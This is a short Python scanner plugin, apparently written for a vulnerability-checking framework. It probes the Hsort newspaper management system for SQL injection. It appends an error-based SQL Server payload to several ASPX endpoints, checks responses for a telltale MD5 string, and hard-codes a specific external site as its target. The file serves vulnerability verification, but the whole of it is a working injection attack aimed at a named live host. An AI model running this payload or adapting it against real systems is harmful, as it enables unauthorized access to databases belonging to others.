#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:Hsort报刊管理系统漏洞打包2
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0113030
#Author:xq17

def assign(service, arg):
    if service == 'hsort':
        return True, arg

def audit(arg):
    urls = [ 
    "BlackNews.aspx?papername=1&qnum=1&pagenum=1&id=1",
    "BlackShow.aspx?paperName=1&qnum=1",
    "admin/B/ajax/showB1.aspx?paperName=%2527",
    # "getReault.aspx?paperName=1&bdate=01/01/2011&edate=01/01/2011&news=%2527",
    # "pagePiclist.aspx?qnum=129&pagenum=1&paperName=%2527",
    ]

    data = "(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code==500 or code == 200 and 'cc175b9c0f1b6a831c399e269772661' in res:
            security_hole(arg + url)

if __name__=="__main__":
    from dummy import *
    audit(assign('hsort','http://epaper.btwhw.com/')[1])